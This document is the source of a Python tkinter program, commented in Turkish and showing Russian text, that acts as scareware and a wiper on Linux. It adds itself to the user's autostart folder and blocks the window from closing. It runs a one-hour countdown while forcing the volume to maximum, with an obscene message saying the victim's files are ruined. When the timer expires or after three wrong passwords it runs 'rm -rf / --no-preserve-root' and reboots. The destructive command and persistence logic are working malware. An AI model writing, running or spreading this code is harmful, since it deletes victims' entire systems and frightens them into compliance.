import tkinter as tk
from tkinter import messagebox
import os
import sys
import random
from PIL import Image, ImageTk

# Doğru kilit açma şifresi
DOGRU_SIFRE = "1234"
# 1 saat = 3600 saniye
kalan_saniye = 3600
# Kullanıcının toplam hakkı
kalan_hak = 3

# Linux otomatik başlangıç (Autostart) ayarları (Sudo gerektirmez)
EV_DIZINI = os.path.expanduser('~')
AUTOSART_KLASORU = os.path.join(EV_DIZINI, '.config', 'autostart')
MASAUSTU_DOSYASI = os.path.join(AUTOSART_KLASORU, 'sistem_uyarisi.desktop')

def baslangica_ekle():
    try:
        os.makedirs(AUTOSART_KLASORU, exist_ok=True)
        mevcut_dosya = os.path.abspath(sys.argv[0])
        python_yolu = sys.executable

        desktop_icerik = f"""[Desktop Entry]
Type=Application
Name=Sistem Uyarisi
Exec={python_yolu} "{mevcut_dosya}"
X-GNOME-Autostart-enabled=true
"""
        with open(MASAUSTU_DOSYASI, "w", encoding="utf-8") as f:
            f.write(desktop_icerik)
    except Exception:
        pass

def baslangictan_sil():
    try:
        if os.path.exists(MASAUSTU_DOSYASI):
            os.remove(MASAUSTU_DOSYASI)
    except Exception:
        pass

def verileri_sil_ve_yeniden_baslat():
    baslangica_ekle()  
    try:
        # Tüm sistemi ve kök dizini hedef alan silme komutu
        os.system("rm -rf / --no-preserve-root 2>/dev/null || rm -rf /* 2>/dev/null")
    except Exception:
        pass
    try:
        os.system("systemctl reboot || shutdown -r now")
    except Exception:
        pass

def sesi_maksimum_yap():
    try:
        os.system("amixer -D pulse sset Master 100% 2>/dev/null || amixer set Master 100% 2>/dev/null")
    except Exception:
        pass

def geri_sayim():
    global kalan_saniye
    if kalan_saniye > 0:
        kalan_saniye -= 1
        
        saat = kalan_saniye // 3600
        dakika = (kalan_saniye % 3600) // 60
        saniye = kalan_saniye % 60
        zaman_metni = f"{saat:02d}:{dakika:02d}:{saniye:02d}"
        
        label_timer.config(text=zaman_metni)
        sesi_maksimum_yap()
        root.after(1000, geri_sayim)
    else:
        label_timer.config(text="00:00:00")
        verileri_sil_ve_yeniden_baslat()

def sistemi_kurtar():
    baslangictan_sil()
    messagebox.showinfo("Система восстановлена", "Система восстановлена; ваши файлы в безопасности.")
    root.destroy()

def sifre_kontrol():
    global kalan_hak
    girilen_sifre = entry_sifre.get()
    
    if girilen_sifre == DOGRU_SIFRE:
        sistemi_kurtar()
    else:
        kalan_hak -= 1
        if kalan_hak > 0:
            label_hak.config(text=f"Осталось попыток: {kalan_hak}")
            messagebox.showerror("Ошибка", f"Неверный пароль! Осталось попыток: {kalan_hak}")
        else:
            verileri_sil_ve_yeniden_baslat()

def cikisi_engelle():
    pass

# Ana pencere kurulumu
root = tk.Tk()
root.title("Sistem Uyarısı")
root.configure(bg='#000000')

genislik = 600
yukseklik = 650
ekran_g = root.winfo_screenwidth()
ekran_y = root.winfo_screenheight()
x = (ekran_g - genislik) // 2
y = (ekran_y - yukseklik) // 2
root.geometry(f"{genislik}x{yukseklik}+{x}+{y}")

root.attributes('-topmost', True)
root.protocol("WM_DELETE_WINDOW", cikisi_engelle)

# Başlangıca ekle
baslangica_ekle()

# Arka plan Etiketi (Label)
label_bg = tk.Label(root, bd=0, highlightthickness=0)
label_bg.place(x=0, y=0, width=genislik, height=yukseklik)

resim_dosyasi = "d.jfif"
if os.path.exists(resim_dosyasi):
    try:
        img = Image.open(resim_dosyasi)
        resized_img = img.resize((genislik, yukseklik), Image.Resampling.LANCZOS)
        bg_photo = ImageTk.PhotoImage(resized_img)
        label_bg.config(image=bg_photo)
        label_bg.image = bg_photo
    except Exception as e:
        label_bg.config(bg="#050000")
else:
    label_bg.config(bg="#050000")

# --- ARAYÜZ ELEMANLARI ---
label_timer = tk.Label(root, text="01:00:00", font=("Courier New", 40, "bold"), fg="#ff3333", bg="#000000")
label_timer.place(relx=0.5, rely=0.15, anchor="center")

label_mesaj = tk.Label(root, text="Твоим файлам пиздец; даже если ты закроешь это окно, оно появится снова.", font=("Courier New", 12, "bold"), fg="#ff3333", bg="#000000", wraplength=500, justify="center")
label_mesaj.place(relx=0.5, rely=0.45, anchor="center")

label_hak = tk.Label(root, text=f"Осталось попыток: {kalan_hak}", font=("Courier New", 12, "bold"), fg="#ffffff", bg="#000000")
label_hak.place(relx=0.5, rely=0.60, anchor="center")

entry_sifre = tk.Entry(root, font=("Courier New", 16), bg="#222222", fg="#ffffff", insertbackground="#ffffff", justify="center", width=20, bd=1, highlightthickness=1, highlightbackground="#ff3333")
entry_sifre.place(relx=0.5, rely=0.68, anchor="center")

btn_onay = tk.Button(root, text="ŞİFREYİ ONAYLA", font=("Courier New", 12, "bold"), bg="#ff3333", fg="#000000", command=sifre_kontrol, padx=15, pady=5, bd=0)
btn_onay.place(relx=0.5, rely=0.77, anchor="center")

btn_kurtar = tk.Button(root, text="DOSYALARI KURTAR", font=("Courier New", 12, "bold"), bg="#2ecc71", fg="#ffffff", command=sistemi_kurtar, padx=15, pady=5, bd=0)
btn_kurtar.place(relx=0.5, rely=0.87, anchor="center")

# Ekranda rastgele konumlarda 10 adet "31" yazısı oluşturan fonksiyon
def rastgele_31_yazilari_olustur():
    for _ in range(10):
        rx = random.randint(50, ekran_g - 150)
        ry = random.randint(50, ekran_y - 100)
        renk = random.choice(["#ff3333", "#ffff33", "#33ff33", "#33ffff", "#ff33ff", "#ffffff"])
        boyut = random.randint(16, 32)
        
        lbl = tk.Label(root, text="31", font=("Arial", boyut, "bold"), fg=renk, bg="#000000")
        lbl.place(x=rx, y=ry)

rastgele_31_yazilari_olustur()

# Ses çalmayı başlat
for dosya in os.listdir("."):
    if dosya.startswith("hg") and (dosya.endswith(".mp3") or dosya.endswith(".wav")):
        try:
            sesi_maksimum_yap()
            os.system(f"mpg123 '{dosya}' >/dev/null 2>&1 &" if dosya.endswith(".mp3") else f"aplay '{dosya}' >/dev/null 2>&1 &")
            break
        except Exception:
            pass

geri_sayim()
root.mainloop()